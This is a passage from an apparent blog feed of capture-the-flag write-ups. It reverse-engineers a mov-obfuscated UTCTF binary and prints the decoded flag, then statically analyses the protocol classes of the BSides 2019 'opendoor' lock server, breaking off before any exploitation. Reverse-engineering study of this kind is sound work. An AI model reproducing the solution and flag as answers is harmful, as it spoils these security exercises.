    mov byte [fp-9*4], R0
    mov R0, 10
    mov byte [fp-0x23], R0
    mov R0, 0x33
    mov byte [fp-0x22], R0
    mov R0, 0x19
    mov byte [fp-0x21], R0
    mov R0, 14
    mov byte [fp-8*4], R0
    mov R0, 6
    mov byte [fp-0x1f], R0
    mov R0, 0x31
    mov byte [fp-0x1e], R0
    mov R0, 0x31
    mov byte [fp-0x1d], R0
    mov R0, 0x1e
    mov byte [fp-7*4], R0
    mov R0, 0x3c
    mov byte [fp-0x1b], R0
    mov R0, 0x17
    mov byte [fp-0x1a], R0
    mov R0, 10
    mov byte [fp-0x19], R0
    mov R0, 0x31
    mov byte [fp-6*4], R0
    mov R0, 6
    mov byte [fp-0x17], R0
    mov R0, 0x19
    mov byte [fp-0x16], R0
    mov R0, 10
    mov byte [fp-0x15], R0
    mov R0, 9
    mov byte [fp-5*4], R0
    mov R0, 0x3c
    mov byte [fp-0x13], R0
    mov R0, 0x19
    mov byte [fp-0x12], R0
    mov R0, 12
    mov byte [fp-0x11], R0
    mov R0, 0x3c
    mov byte [fp-4*4], R0
    mov R0, 0x19
    mov byte [fp-0xf], R0
    mov R0, 13
    mov byte [fp-0xe], R0
    mov R0, 10
    mov byte [fp-0xd], R0
    mov R0, 0x3c
    mov byte [fp-3*4], R0
    mov R0, 0
    mov byte [fp-0xb], R0
    mov R0, 13
    mov byte [fp-0xa], R0
    mov R0, 6
    mov byte [fp-0x9], R0
    mov R0, 0x31
    mov byte [fp-2*4], R0
    mov R0, 0x31
    mov byte [fp-7], R0
    mov R0, 10
    mov byte [fp-6], R0
    mov R0, 0x33
    mov byte [fp-5], R0
    mov R0, 4
    mov byte [fp-4], R0
    mov R0, 10
    mov byte [fp-3], R0
    mov R0, 2
    mov byte [fp-2], R0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At &lt;strong&gt;0x804ba9c&lt;/strong&gt;, the int variable at &lt;strong&gt;fp-0x4c&lt;/strong&gt; is set to 0.&lt;/p&gt;
&lt;p&gt;If &lt;strong&gt;target&lt;/strong&gt; is &lt;strong&gt;0x8804bb37&lt;/strong&gt;, it executes the following&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    if (target == 0x8804bb37)
    {
        ;   restore the registers
        R{0,1,2,3} = jmp_r{0,1,2,3}
        F{0,1} = jmp_f{0,1}
        D{0,1} = jmp_d{0, 1}
        dword_804e044 = dword_85f717c
        dword_804e04c = dword_85f7184

        ; set execution flag
        on = 1
    }

    mov R3, [fp-19*4]
    if (on)
    {
        mov R3, [R3]
        mov R2, [fp-37*4]
        add R2, R3
        mov R1, [fp-18*4]
        add R3, R1
        mov R0, byte [R3]
        mov R3, R0
        xor R3, 0x53
        sub R3, 3
        xor R3, 0x33
        mov R0, R3
        mov [R2], R0
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since, the target contains &lt;strong&gt;0x88048744&lt;/strong&gt; which is not &lt;strong&gt;0x8804bb37&lt;/strong&gt;, none of the instructions in the if enclosed by &lt;strong&gt;on&lt;/strong&gt; is executed.&lt;/p&gt;
&lt;p&gt;At &lt;strong&gt;0x0804C2D4&lt;/strong&gt;, we have another branch check&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    if (target == 0x8804C2D4)
    {
        RESTORE_REGS()
        on = 1
    }

        mov R3, [fp-19*4]

    if (on)
    {
        add R3, 1
        mov [fp-19*4], R3
        mov R3, [fp-19*4]
        setc
        sbb R3, 0x47
        mov branch_temp, 0x8804bb37
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/10.png&#34; alt=&#34;i10&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;alu_false&lt;/strong&gt; contains 1 at index 0, and 0 at the remaining indices. So, this sets the complement of the &lt;strong&gt;Carry&lt;/strong&gt; flag.&lt;br&gt;
&lt;strong&gt;ZeroFlag&lt;/strong&gt; is evaluated as a &lt;strong&gt;NOR&lt;/strong&gt; logic, i.e., &lt;code&gt;ZF = !(alu_s[0] | alu_s[1] | alu_s[2] | alu_s[3])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/11.png&#34; alt=&#34;i11&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;alu_b7&lt;/strong&gt; is an array of 256 dwords, the first 128 are zero, and the rest are 1. Indexing into this array determines the &lt;strong&gt;Sign&lt;/strong&gt; bit (bit 7) of the index.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/12.png&#34; alt=&#34;i12&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Okay, so &lt;strong&gt;alu_cmp_of&lt;/strong&gt; represents a truth table. Of what ?
Well, there are only two out of the eight minterms set. So, we get the following SOP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;x&#39;ys + xy&#39;s&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where x, y, s are the sign bits of &lt;strong&gt;alu_x&lt;/strong&gt;, &lt;strong&gt;alu_y&lt;/strong&gt;, &lt;strong&gt;alu_z&lt;/strong&gt;.&lt;br&gt;
Cool ! This is the &lt;strong&gt;overflow flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/13.png&#34; alt=&#34;i13&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It xor&amp;rsquo;s &lt;strong&gt;SignFlag&lt;/strong&gt; and &lt;strong&gt;OverflowFlag&lt;/strong&gt; and sets &lt;strong&gt;target&lt;/strong&gt; to &lt;strong&gt;branch_temp&lt;/strong&gt; which is &lt;strong&gt;0x8804bb37&lt;/strong&gt;. By x0ring the sign and overflow flags we get the &lt;strong&gt;LessThan&lt;/strong&gt; flag.&lt;/p&gt;
&lt;p&gt;So, if R3 is less than 0x47, the target is set to &lt;strong&gt;0x8804bb37&lt;/strong&gt;.&lt;br&gt;
Then we have the following&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov byte [fp-0x4d], 0
    if (target == 0x8804CA3B)
    {
        on = 1
    }
    if (on)
    {
        mov esp, fp
        mov D1, [esp]
        mov dword_804e04c, [esp+4]
        sub esp, 4*2
        mov eax, [esp]
        sub esp, 4
        mov F1, eax
        mov eax, [esp]
        sub esp, 4
        mov R3, eax
        mov eax, [esp]
        sub esp, 4
        mov R2, eax
        mov eax, [esp]
        sub esp, 4
        mov R1, eax
        mov eax, [esp]
        sub esp, 4
        mov fp, eax
        mov eax, [esp]
        sub esp, 4
        mov branch_temp, eax
        mov target, branch_temp
        on = 0
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A SIGILL is executed which causes the control to jump to master loop. And the execution of the instructions are skipped until the address the control reaches at &lt;strong&gt;0x804bb37&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So, this is basically a &lt;strong&gt;while loop&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The control first compares R3 with 0x47 and branches to &lt;strong&gt;0x804bb37&lt;/strong&gt; while R3 is less than 0x47. When the condition becomes false, it executes from &lt;strong&gt;0x804ca3b&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;algorithm&#34;&gt;Algorithm&lt;/h2&gt;
&lt;p&gt;So, the logic is&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;()
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; arr[] = { &lt;span style=&#34;color:#3677a9&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt; };

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;0x47&lt;/span&gt;; ++i)
        {
            arr[i] = (arr[i]^&lt;span style=&#34;color:#3677a9&#34;&gt;0x53&lt;/span&gt;)-&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt; ^ &lt;span style=&#34;color:#3677a9&#34;&gt;0x33&lt;/span&gt;;
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Executing the above code, yields the flag - &lt;code&gt;utflag{sentence_that_is_somewhat_tangentially_related_to_the_challenge}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://drwho.virtadpt.net/files/mov.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MoV is Turing Complete&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        <item>
        <title>BSides CTF 2019 - opendoor</title>
        <link>http://localhost:1313/post/bsides-ctf-2019-opendoor/</link>
        <pubDate>Wed, 06 Mar 2019 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/bsides-ctf-2019-opendoor/</guid>
        <description>&lt;p&gt;This one is a pretty interesting challenge. My solution is just static analysis.&lt;/p&gt;
&lt;p&gt;But before jumping into &lt;strong&gt;main&lt;/strong&gt;, I&amp;rsquo;ll be analyzing the &lt;strong&gt;opendoor&lt;/strong&gt; namespace&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/buffer_constr.png&#34; alt=&#34;buffer_const&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;So, the class &lt;strong&gt;Buffer&lt;/strong&gt; has two members; a vector of bytes and a offset indicating where to start the next read&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;namespace&lt;/span&gt; opendoor {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;Buffer&lt;/span&gt; {
            shared_ptr&amp;lt;vector&amp;lt;byte&amp;gt;&amp;gt; m_buffer;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; m_offset;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt;:
            Buffer() {
                m_buffer = make_shared(vector&amp;lt;byte&amp;gt;);
                m_offset = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
            }
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        };
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now lets analyze the &lt;strong&gt;Buffer::read&amp;lt;T&amp;gt;&lt;/strong&gt; functions. This is important as it tells how the server unmarshalls the data.&lt;br&gt;
&lt;strong&gt;Buffer::read&amp;lt;bool&amp;gt;&lt;/strong&gt; is a wrapper to &lt;strong&gt;Buffer::read&amp;lt;uchar&amp;gt;&lt;/strong&gt;.&lt;br&gt;
Int32 and Int64 are being read in &lt;strong&gt;BigEndian&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/read_long.png&#34; alt=&#34;read_long&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;i.e., var_20[7 - var_14] = Buffer::read&amp;lt;uchar&amp;gt;()&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;read&amp;lt;shared_ptr&amp;lt;vector&amp;lt;uchar&amp;gt;&amp;gt;&amp;gt;&lt;/strong&gt; and &lt;strong&gt;read&amp;lt;string&amp;gt;&lt;/strong&gt; work the same. The first call &lt;strong&gt;read&amp;lt;uint&amp;gt;&lt;/strong&gt; to read the no. of. bytes and &lt;strong&gt;read&amp;lt;uchar&amp;gt;&lt;/strong&gt; to read that many bytes i.e., a vector is a string of bytes prefixed by its length&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/aes_crypter_constr.png&#34; alt=&#34;aes_const&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The constructor of &lt;strong&gt;AESCrypter&lt;/strong&gt; calls the superclass constructor, before initializing the members. &lt;strong&gt;AESCrypter::decrypt&lt;/strong&gt; and &lt;strong&gt;AESCrypter::encrypt&lt;/strong&gt; perform decryption and encryption using AES 256 CBC.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;namespace&lt;/span&gt; opendoor {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;Crypter&lt;/span&gt; {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt;:
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;virtual&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; decrypt(shared_ptr&amp;lt;Buffer&amp;gt;) = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;virtual&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;encrypt&lt;/span&gt;(shared_ptr&amp;lt;Buffer&amp;gt;) = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
        };

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;AESCrypter&lt;/span&gt; : &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt; Crypter {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* key;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* iv;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt;:
            AESCrypter() {
                key = opendoor::def_key;
                iv = opendoor::def_iv;
            }
            AESCrypter(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* k, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* i) {
                key = k; iv = i;
            }
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;* &lt;span style=&#34;color:#447fcf&#34;&gt;decrypt&lt;/span&gt;(shared_ptr&amp;lt;Buffer&amp;gt; p) {
                buf = _Decrypt(*p, key, iv);
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; make_shared&amp;lt;Buffer&amp;gt;(buf);
            }
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;* &lt;span style=&#34;color:#447fcf&#34;&gt;encrypt&lt;/span&gt;(shared_ptr&amp;lt;Buffer&amp;gt; p) {
                buf = _Encrypt(*p, key, iv);
                ans = make_shared&amp;lt;Buffer&amp;gt;();
                ans-&amp;gt;write(buf.size());
                ans-&amp;gt;write(buf);
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans;
            }
        };
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There is another class that implements &lt;strong&gt;Crypter&lt;/strong&gt;. Its the &lt;strong&gt;PlainCrypter&lt;/strong&gt;. Well you have guessed it right. Its a dummy class which neither encrypts nor decrypts. It has another parameter which if set to TRUE, prints debug logs.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s move to &lt;strong&gt;opendoor::State&lt;/strong&gt; which encapsulates a lock for the magic door.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/state_constr.png&#34; alt=&#34;state_const&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The methods of &lt;strong&gt;State&lt;/strong&gt; are straightforward. Here&amp;rsquo;s the representation of &lt;strong&gt;State&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;namespace&lt;/span&gt; opendoor {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;State&lt;/span&gt; {
            byte m_is_unlocked;
            byte m_is_debuggable;
            int32 m_unlock_count;
            int64 m_door_id;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt;:
            State() {
                m_is_unlocked = m_is_debuggable = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
                m_unlock_count = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
                m_door_id = &lt;span style=&#34;color:#3677a9&#34;&gt;0x55AA55AA5A5AA5A5&lt;/span&gt;;
            }
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;unlock&lt;/span&gt;() {
                m_is_unlocked = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
                m_unlock_count++;
            }
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;lock&lt;/span&gt;() {
                m_is_unlocked = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
            }
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// getters ...
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        };
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;the-messaging-protocol&#34;&gt;The Messaging Protocol&lt;/h2&gt;
&lt;p&gt;The &lt;strong&gt;Message&lt;/strong&gt; class consists of six methods - &lt;strong&gt;parse_message&lt;/strong&gt;, &lt;strong&gt;execute&lt;/strong&gt;, &lt;strong&gt;to_string&lt;/strong&gt;, &lt;strong&gt;serialize&lt;/strong&gt;, &lt;strong&gt;ptr&lt;/strong&gt;, and &lt;strong&gt;get_id&lt;/strong&gt; out of which &lt;strong&gt;parse_message&lt;/strong&gt;, &lt;strong&gt;to_string&lt;/strong&gt; and &lt;strong&gt;get_id&lt;/strong&gt; are pure virtual, i.e., they have to be implemented in the classes implementing &lt;strong&gt;Message&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The subclasses of &lt;strong&gt;Message&lt;/strong&gt; are of:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Messages that have a request and response - &lt;strong&gt;UnlockMessage&lt;/strong&gt;, &lt;strong&gt;DebugMessage&lt;/strong&gt;, &lt;strong&gt;PingMessage&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ErrorMessage&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Message::serialize&lt;/strong&gt; performs the common serialization.&lt;br&gt;
It writes the &lt;em&gt;message_id&lt;/em&gt; followed by the &lt;em&gt;timestamp&lt;/em&gt; returned by &lt;strong&gt;time()&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Now let&amp;rsquo;s go to &lt;strong&gt;Message::ParseMessage&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/msg_parse_msg.png&#34; alt=&#34;msg_parse_msg&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It reads two Int32 words i.e., the &lt;strong&gt;message_id&lt;/strong&gt; and &lt;strong&gt;timestamp&lt;/strong&gt; and checks if the recieved timestamp bounded by &lt;strong&gt;5 seconds&lt;/strong&gt; of the current timestamp. Otherwise it responds with an &lt;strong&gt;INVALID_TIMESTAMP&lt;/strong&gt; ErrorMessage. I&amp;rsquo;ll discuss later how I got error constant names.&lt;/p&gt;
&lt;p&gt;The generic parsing routine&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;    ParseMessage(shared_ptr&amp;lt;Buffer&amp;gt; p)
    {
        msg_id = p-&amp;gt;read();
        msg_stamp = p-&amp;gt;read();
        
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// time_in_window(a, b) == return abs(time(NULL)-a) &amp;lt;= b
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (! time_in_window(msg_stamp, &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;))
        {
            err = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; ErrorMessage(INVALID_TIMESTAMP);
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; err-&amp;gt;ptr();
        }
        f = messages_map.find(msg_id)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (f == messages_map.end())
        {
            err = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; ErrorMessage(INVALID_MESSAGE);
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; err-&amp;gt;ptr();
        }
        msg = (f-&amp;gt;second)();

        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// do message specific parse
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (! msg-&amp;gt;parse_message(p))
        {
            err = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; ErrorMessage(INVALID_PARSE);
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; err-&amp;gt;ptr();
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the timestamp must be within 5 seconds.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Message&lt;/strong&gt; also defines 7 lambdas that creates an instance each of the concrete message classes and encapsulates within a &lt;strong&gt;shared_ptr&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;1-unlockmessage&#34;&gt;1. UnlockMessage&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;UnlockMessage::parse_message&lt;/strong&gt; reads two Int64 words and stores them in its member variables.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/unlock_exec.png&#34; alt=&#34;unlock_exec&#34;  /&gt;&lt;/p&gt;
